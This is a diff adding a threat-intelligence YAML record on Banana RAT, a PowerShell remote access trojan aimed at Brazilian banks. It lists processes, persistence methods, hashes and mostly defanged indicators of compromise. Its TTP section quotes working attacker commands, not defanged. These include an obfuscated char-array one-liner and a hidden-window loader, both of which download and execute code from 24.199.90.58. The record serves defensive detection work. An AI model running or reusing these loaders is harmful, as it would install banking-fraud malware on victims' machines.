@@ -1,0 +1,117 @@
+title: 'Inside SHADOW-WATER-063''s Banana RAT: From Build Server to Banking Fraud'
+description: Banana RAT is a PowerShell-based remote access trojan targeting Brazilian
+  financial institutions, operated by a financially motivated Brazilian Portuguese-speaking
+  actor tracked as SHADOW-WATER-063, featuring a Python/FastAPI server-side polymorphism
+  engine, Pix-QR interception, and bank-overlay fraud capabilities.
+attribution: SHADOW-WATER-063
+malware_families:
+- Banana RAT
+- Backdoor.PS1.BANANARAT.A
+- Trojan.PS1.BANANARAT.A
+- BANANARAT
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - csc.exe
+  - cmd.exe
+  - msedge.exe
+  command_lines:
+  - C:\WINDOWS\system32\cmd.exe /c ""C:\Users\70397\Downloads\Consultar_NF-e.bat"
+    "
+  - powershell $u=[char[]](36,116,115,61,39,104,116,116,112,58,47,47,50,52,46,49,57,57,46,57,48,46,53,56,47,115,116,46,116,120,116,39,59,105,101,120,40,105,114,109,32,36,116,115,41)-join''
+    iex($u)
+  - C:\WINDOWS\system32\cmd.exe /c C:\Users\70397\Downloads\Consultar NF-e.bat
+  powershell:
+  - Net.WebClient.DownloadFile
+  - Start-BitsTransfer
+  - IEX
+  - ScriptBlock::Create
+  - PS_ScheduledTask.ExecMethod(RegisterByUser)
+  - $ts='http://24.199.90.58/st.txt';iex(irm $ts)
+  - 'Add-Type -Name W -Namespace H -MemberDefinition ''[DllImport("user32.dll")]public
+    static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public
+    static extern IntPtr GetConsoleWindow();'' -EA 0
+
+    [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)
+
+    $f="C:\Users\Public\Documents\msedge.txt"
+
+    $d=Split-Path $f
+
+    if(!(Test-Path $d)){md $d -Force|Out-Null}
+
+    (New-Object Net.WebClient).DownloadFile(''http://24.199.90.58/payload.php'',$f)
+
+    & ([ScriptBlock]::Create((gc $f -Raw))) -ScriptPath $f'
+  scripts:
+  - Consultar_NF-e.bat
+  - st.txt
+  - st.php
+  - payload.php
+  - msedge.txt
+  - servidor_completo_pool.py
+  - monitor_pool.py
+  - instalar_completo_pool.sh
+  - stats-view.php
+  - stats-reset.php
+  - proteger.py
+  registry_keys: []
+  image_loads:
+  - zxing*.dll
+  - user32.dll
+  - ZXing.NET
+  - kernel32.dll
+  network_connections:
+  - powershell.exe -> 24[.]199[.]90[.]58:80
+  - powershell.exe -> 24[.]199[.]90[.]58:443
+  - powershell.exe -> 24.199.90[.]58:80
+  - powershell.exe -> c[.]windowsk-cdn[.]com:443
+  - powershell.exe -> 162.141.111[.]227:443
+  - msedge.txt -> c[.]windowsk-cdn[.]com:443
+  - msedge.txt -> 162.141.111[.]227:443
+  file_activity:
+  - C:\Users\<user>\Downloads\Consultar_NF-e.bat
+  - C:\Users\Public\Documents\msedge.txt
+  - C:\Users\70397\AppData\Roaming\Microsoft\Diagnosis\ETW\msedgeupdate.txt
+  - C:\ProgramData\Microsoft\Diagnosis\ETW\
+  - monitor.txt
+  - st.txt
+  - msedge.txt
+  persistence:
+  - Hidden scheduled task registered via PS_ScheduledTask.ExecMethod(RegisterByUser)
+    configured to run powershell.exe with -WindowStyle Hidden -ExecutionPolicy Bypass
+    and an encoded PowerShell command every minute for 9,999 days
+  - Malicious scheduled task configured to run powershell.exe with -WindowStyle Hidden
+    and -ExecutionPolicy Bypass every minute for 9,999 days, hidden from standard
+    Task Scheduler views
+  - Windows service named MicrosoftEdgeUpdate Core running as LocalSystem
+  - Scheduled Task persistence
+  - Run key persistence
+  process_relations:
+  - cmd.exe -> powershell.exe
+  - powershell.exe -> csc.exe
+iocs:
+  hashes:
+  - ecdc8fade561a75d68235859ad8b1fe131db2c458b4894268e38e90ecab1c47f
+  - 38dfeb772afbd01c04eddda120d283acfb1147a6dc3d54ac62fe23ad06e39d8f
+  - 4912b1134e69ade7266e8508eec33ccb2d80ad693f1dbc4f1f4344c6dfcf2ff1
+  - d7545b6dacebdae27effb3c778c5e349027ec789c76ae4f777bd9ba56a70cdaa
+  ip_addresses:
+  - 24[.]199[.]90[.]58
+  - 24.199.90[.]58
+  - 162.141.111[.]227
+  domains:
+  - convitemundial2026[.]com
+  - c[.]windowsk-cdn[.]com
+  - windowsk-cdn[.]com
+  urls:
+  - hxxps://convitemundial2026[.]com/Consultar_NF-e[.]bat
+  - hxxp://24[.]199[.]90[.]58/payload[.]php
+  - hxxp[://]24[.]199[.]90[.]58:80/
+  - hxxp[://]24[.]199[.]90[.]58:80/payload[.]php
+  - hxxp[://]24[.]199[.]90[.]58:80/st[.]txt
+authors: []
+reference: https://www.trendmicro.com/en_us/research/26/e/banana-rat.html
+date_of_publication: May 19, 2026
+file_creation_date: May 22, 2026
